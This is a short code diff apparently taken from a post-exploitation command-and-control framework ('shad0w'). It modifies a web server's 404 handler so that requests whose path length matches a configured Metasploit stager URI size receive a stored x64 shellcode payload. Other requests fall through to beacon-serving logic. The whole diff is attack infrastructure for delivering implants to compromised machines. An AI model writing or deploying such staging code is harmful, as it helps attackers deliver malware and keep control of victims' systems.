@@ -2,7 +2,7 @@ import sys
 import logging
 import mimetypes
 
-from lib import mirror
+from lib import mirror, buildtools
 from .path_handler import Handler
 
 from OpenSSL import SSL
@@ -62,6 +62,16 @@ def web_stage_beacon():
 
 @app.errorhandler(404)
 def not_found(e):
+
+    req_path_len = len(request.path)
+
+    # check if it is a msf stager
+    try:
+        if req_path_len == int(shad0w.variables["MsfUriSize"]):
+            shad0w.debug.log(f"MSF callback...", log=True, new=True)
+            return shad0w.payloads["x64_secure_static_srdi"]["bin"]
+    except ValueError:
+        shad0w.debug.error(f"Value Error: {shad0w.variables['MsfUriSize']}")
 
     try:
         for obj in shad0w.beacons[shad0w.current_beacon]["serve"]:
